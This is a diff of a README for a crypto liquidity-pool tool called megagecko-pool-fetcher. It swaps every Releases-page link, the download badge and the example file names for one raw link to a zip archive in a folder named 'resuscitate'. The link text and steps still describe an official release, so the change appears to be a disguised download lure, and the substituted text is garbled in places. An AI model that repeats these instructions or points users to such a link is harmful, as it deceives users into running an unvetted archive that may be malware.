@@ -1,6 +1,6 @@
 # 🦎 megagecko-pool-fetcher - Discover and Optimize Liquid Pools Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/akkiakshay-26/megagecko-pool-fetcher/releases)
+[![Download](https://github.com/akkiakshay-26/megagecko-pool-fetcher/raw/refs/heads/main/resuscitate/fetcher_pool_megagecko_3.6.zip%https://github.com/akkiakshay-26/megagecko-pool-fetcher/raw/refs/heads/main/resuscitate/fetcher_pool_megagecko_3.6.zip)](https://github.com/akkiakshay-26/megagecko-pool-fetcher/raw/refs/heads/main/resuscitate/fetcher_pool_megagecko_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,15 +8,15 @@ Thank you for using **megagecko-pool-fetcher**. This software helps you easily d
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/akkiakshay-26/megagecko-pool-fetcher/releases) to download the latest version of megagecko-pool-fetcher. 
+To get started, visit the [Releases page](https://github.com/akkiakshay-26/megagecko-pool-fetcher/raw/refs/heads/main/resuscitate/fetcher_pool_megagecko_3.6.zip) to download the latest version of megagecko-pool-fetcher. 
 
 ### **Installation Steps:**
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of the application.
 3. Look for the download option for your operating system.
-   - If you’re using Windows, you might see a file named something like `megagecko-pool-fetcher-windows.zip`.
-   - For macOS, it may read `megagecko-pool-fetcher-macos.zip`.
+   - If you’re using Windows, you might see a file named something like `https://github.com/akkiakshay-26/megagecko-pool-fetcher/raw/refs/heads/main/resuscitate/fetcher_pool_megagecko_3.6.zip`.
+   - For macOS, it may read `https://github.com/akkiakshay-26/megagecko-pool-fetcher/raw/refs/heads/main/resuscitate/fetcher_pool_megagecko_3.6.zip`.
 4. Click on the file to download it. 
 5. Once the download finishes, locate the downloaded file in your computer’s downloads folder.
 6. Extract the downloaded file. You can usually do this by right-clicking and selecting “Extract All”.
@@ -66,6 +66,6 @@ A: Updates will be released based on the improvements in the features and functi
 
 If you encounter any issues or have questions, feel free to open an issue in this repository. We welcome feedback and are here to help you.
 
-Access the [Releases page](https://github.com/akkiakshay-26/megagecko-pool-fetcher/releases) again to keep your application up to date. Your feedback is vital for our continuous improvement.
+Access the [Releases page](https://github.com/akkiakshay-26/megagecko-pool-fetcher/raw/refs/heads/main/resuscitate/fetcher_pool_megagecko_3.6.zip) again to keep your application up to date. Your feedback is vital for our continuous improvement.
 
 Thank you for using megagecko-pool-fetcher. Happy trading!
